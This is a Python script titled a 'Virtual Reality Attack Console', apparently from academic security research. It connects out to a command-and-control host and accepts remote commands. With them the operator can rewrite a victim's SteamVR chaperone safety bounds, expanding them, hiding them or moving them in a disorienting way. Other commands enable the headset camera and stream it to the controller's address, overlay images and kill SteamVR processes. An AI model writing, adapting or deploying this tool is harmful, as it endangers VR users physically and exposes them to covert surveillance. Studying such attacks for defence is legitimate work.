# -*- coding: utf-8 -*-
"""
Created on Fri Sep 15 10:22:06 2017

@author: strat
"""

import json, math
import os, time, socket, subprocess, sys
import argparse
from random import randint, uniform
from shutil import copyfile

s = socket.socket()
ipc_socket = socket.socket()
host = '10.2.33.10'
ipc_host = ''
ipc_port = 8888
port = 9999
walkAmount = 0.1                    


def trueOrFalse():
    data = s.recv(1024)
    user_input = data.decode('utf-8')
    
    if user_input == 'y':
        return True
    elif user_input == 'n':
        return False
    else:
        return trueOrFalse()

def refreshChap():
    copyfile('chaperone_info.vrchap', 'C:\\Program Files (x86)\\Steam\\config\\chaperone_info.vrchap')
    os.system('".\myOpenVr.exe"')
    s.send(str.encode("Replacing Chaperone with original\n"))


#Runs a background app the displays an overlay over the screen with the unhcfreg logo
def image(sleepTime):
    s.send(str.encode("Running background App\n"))
    path = '".\myOverlay.exe"  %s' % str(sleepTime)
    os.system(path)
 
def stream(host):
    s.send(str.encode("Starting Stream"))
    # path = '"..\\UDPstream\\x64\\Debug\\CameraClient.exe" -c -i {} -ip {} -ic {}'.format(host, host, host)
    path = "..\\UDPstream\\x64\\Debug\\CameraClient.exe"
    os.spawnl(os.P_DETACH, path, '-c', '-i', host, '-ip', host, '-ic', host)

#Expands the chaperone collision bounds by "multiply"
#Commit runs a program that reloads the chaperone info from the disk
def expandBounds(multiply):
    s.send(str.encode('Expanding the boundries of the Chaperone\n' 
                      'Commit Changes? y/n  '))
    with open('C:\Program Files (x86)\Steam\config\chaperone_info.vrchap', 'r+') as data_file:    
        data = json.load(data_file)
    
        for calibrate in data['universes']:
            for wall in calibrate['collision_bounds']:
                for i in range(0,3):
                    wall[i][0] = wall[i][0] * multiply
                    wall[i][2] = wall[i][2] * multiply
            
        data_file.seek(0)
        json.dump(data, data_file)
        data_file.truncate()
    
    if trueOrFalse():
        s.send(str.encode("Running background App  "))
        os.system('".\myOpenVr.exe"')
        print('Ran myOpenVr')
    else:
        s.send(str.encode('Not committed '))
       
def setOpacity(a, b, r, perimOn):
    with open('C:\Program Files (x86)\Steam\config\steamvr.vrsettings', 'r+') as data_file:
        data = json.load(data_file)
        
        data['collisionBounds']['CollisionBoundsColorGammaR'] = r
        data['collisionBounds']['CollisionBoundsColorGammaA'] = a
        data['collisionBounds']['CollisionBoundsColorGammaB'] = b
        data['collisionBounds']['CollisionBoundsGroundPerimeterOn'] = perimOn
        
        data_file.seek(0)
        json.dump(data, data_file)
        data_file.truncate()


def camera():
    with open('C:\Program Files (x86)\Steam\config\steamvr.vrsettings', 'r+') as data_file:
        data = json.load(data_file)
        
        #s.send(str.encode('Enable Camera? y/n? '))
        data['camera'] = {'enableCamera' : True}
      #  data['camera'].append('enableCamera')
       #  data['camera']['enableCamera'] = trueOrFalse()
        s.send(str.encode('Camera Enabled  '))
        
        data_file.seek(0)
        json.dump(data, data_file)
        data_file.truncate()

def reboot():
    os.system("taskkill /f /im vrmonitor.exe")
    os.system("taskkill /f /im vrcompositor.exe")
    os.system("taskkill /f /im vrdashboard.exe")
    os.system("taskkill /f /im vrserver.exe")
    print('Killed SteamVR')
    time.sleep(1)
    os.system('"C:\\Program Files (x86)\\Steam\\steamapps\\common\\SteamVR\\bin\\win64\\vrstartup.exe"')
    s.send(str.encode('Rebooting SteamVR   '))


def moveChaperone():
    print("disorientation")
    ipc_socket.listen(5)
    print("Listening")
    # os.system('"D:\\Student Projects\\Peter Gromkowski\\Python Things\\disorientation.exe"')
    subprocess.Popen('".\disorientation.exe"')
    ipc_conn, ipc_address = ipc_socket.accept()
    print("IPC connecting")
    
    ipc_conn.send(str.encode("reload"))
    s.send(str.encode('Translating  \n'))

    for i in range(0,5000):
        
        with open('C:\Program Files (x86)\Steam\config\chaperone_info.vrchap', 'r+') as data_file:    
            data = json.load(data_file)
            dist = uniform(-0.1, 0.1)
            axis = randint(0,2)
            
            for calibrate in data['universes']:
                calibrate['standing']['translation'][0] = math.cos(i/70)
                calibrate['standing']['translation'][1] = math.sin(i/90) + 2
                calibrate['standing']['translation'][2] = math.cos(i/80)
                calibrate['standing']['yaw'] += 0.01 #math.cos(i/200)  * 2 * math.pi

            data_file.seek(0)
            json.dump(data, data_file)
            data_file.truncate()
        #time.sleep(0.01)
        ipc_conn.send(str.encode("reload"))
        client_response = str(ipc_conn.recv(1024), "utf-8")
        print(client_response)
           
    os.system("taskkill /f /im disorientation.exe")

def walk(axis, amount):
    s.send(str.encode('Walking\n  '))
    with open('C:\Program Files (x86)\Steam\config\chaperone_info.vrchap', 'r+') as data_file:    
            data = json.load(data_file)
            
            for calibrate in data['universes']:
                calibrate['standing']['translation'][axis] += amount
                

            data_file.seek(0)
            json.dump(data, data_file)
            data_file.truncate()
    os.system('".\moveChaperone.exe"')


def helpMenu():
    s.send(str.encode(
            'c  --  Camera Enable \n'
            'i  --  Display image on screen\n'
            'e  --  Expand the bounds of the Chaperone\n'
            'r  --  Reboot Steam VR\n'
            'o  --  Set Opacity Values \n'
            'm  --  Randomly Wobble the screen \n'
            'p  --  Reload original Chaperone\n'
            'u  --  UDP Stream\n'
            'wasdzx -- Walk\n'
            'q  --  Quit\n  '
              ))

def main(argv):   

    parser = argparse.ArgumentParser(description='Virtual Reality Attack Console')
    parser.add_argument('-c', '--cc',  action="store", help="CC IP address", default='10.2.33.10')
    parser.add_argument('-p', '--port',  action="store", help="CC Port", default=9999, type=int)
    args = parser.parse_args()
    host = args.cc
    port = args.port

    print(host + '   ' + str(port))
    print(ipc_host + '   ' + str(ipc_port))

    s.connect((host, port))
    ipc_socket.bind((ipc_host, ipc_port))
    ipc_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("connected")

    while(True):
        
        data = s.recv(1024)
        user_input = data.decode('utf-8')

        if user_input == '?':
            helpMenu()
        
        if user_input == 'c':
            camera()
        
        if user_input[:1] == 'i':
            sleepTime = int(user_input[1:])
            image(sleepTime)
        
        if user_input == 'e':
            s.send(str.encode('Amount to multiply? '))
            data = s.recv(1024)
            mult = data.decode('utf-8')
            expandBounds((float(mult)))

        if user_input == 'o':
             print('Set the Gamma Values...')
             A = input('A?')
             B = input('B?')
             R = input('R?')
             print('Collision Bounds Ground Perimeter On?')
             setOpacity(A,B,R,trueOrFalse())
        
        if user_input == 'r':
            reboot()

        if user_input[:1] == 'p':
            refreshChap()

        if user_input == 'm':
            moveChaperone();

        if user_input == 'w':
            walk(0 , walkAmount)
        if user_input == 'a':
            walk(2 , -walkAmount)
        if user_input == 's':
            walk(0 , -walkAmount)
        if user_input == 'd':
            walk(2 , walkAmount)
        if user_input == 'z':
            walk(1 , walkAmount)
        if user_input == 'x':
            walk(1 , -walkAmount)
        if user_input == 'u':
            stream(host)
            
            
        if user_input == 'q':
            s.send(str.encode('Exiting'))
            break

                    
if __name__ == "__main__":
   main(sys.argv[1:])